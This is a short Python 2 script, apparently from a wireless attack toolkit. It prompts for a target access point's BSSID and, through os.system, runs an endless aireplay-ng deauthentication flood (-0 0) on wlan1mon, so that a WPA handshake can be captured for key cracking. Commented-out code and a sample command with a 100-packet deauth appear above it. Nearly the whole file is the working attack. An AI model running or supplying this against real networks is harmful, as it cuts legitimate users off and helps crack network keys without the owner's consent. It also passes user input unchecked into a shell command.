#!/usr/bin/env python
# coding=UTF-8

import os
import socket
import operator
# from termcolor import colored
import sys

# this script needs to be rewritten because it is importing a entire class and therefore it will ask all of the questions again.
# from CrackHead_Targeted import target_BSSID


# sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

# aireplay-ng --deauth 100 -a 78:24:AF:ED:AB:A0 wlan1mon
# aireplay-ng --death <# packets> -a <broadcast MAC> <capture interface>
# class aireplay_Parameters(object):
#
#     def __init__(self, capture_BSSID, amount_Deauth_Packets):
#         self.capture_BSSID = capture_BSSID
#         self.amount_Deauth_Packets = amount_Deauth_Packets
#
#     @classmethod
#     def from_input(cls):
#         return cls(
#             str(raw_input("Enter the BSSID/Broadcast MAC Address of your TARGET: ")),
#             str(raw_input("How many deauthorization packets do you want to send?: "))
#         )


# # OOP (object oriented programming was probably not the best way to approach this and there really
# wasnt a good use for classes in the first place. THe variables were too few, and far in between)
# Because I used classes I now have to deal with the trouble of importing variables, I can't even savethe variable
# New idea is just to completely rewrite CrackHead_Targeted and CrackHead_Replay

# For now, time to retest to make sure that the basic operations of both work fine

os.system('cat /root/ArmsCommander/wirelessattacks/Cylon-Raider/banner_aireplay.txt')

# class aireplay_Parameters(object):
#
#     def __init__(self, capture_BSSID, amount_Deauth_Packets):
#         self.capture_BSSID = capture_BSSID
#         self.amount_Deauth_Packets = amount_Deauth_Packets
#
#     @classmethod
#     def from_input(cls):
#         return cls(
#             str(raw_input("Enter your target BSSID: ")),
#             str(raw_input("How many deauthorization packets do you want to send?: "))
#         )
def main():
    # user_input = aireplay_Parameters.from_input()

    BSSID_capture = str(raw_input("Enter the BSSID of the ACCESS POINT that you want to deauth: "))

    cmd_String = "aireplay-ng -0 0 -a {0} --ignore-negative-one wlan1mon".format(BSSID_capture)
    print 'Starting deauth attack loop'
    print cmd_String
    os.system(cmd_String)
    print 'Deauth packets complete, please check your terminal session containing Airodump, see that you captured the key on the top right corner'
    main()
    return
main()
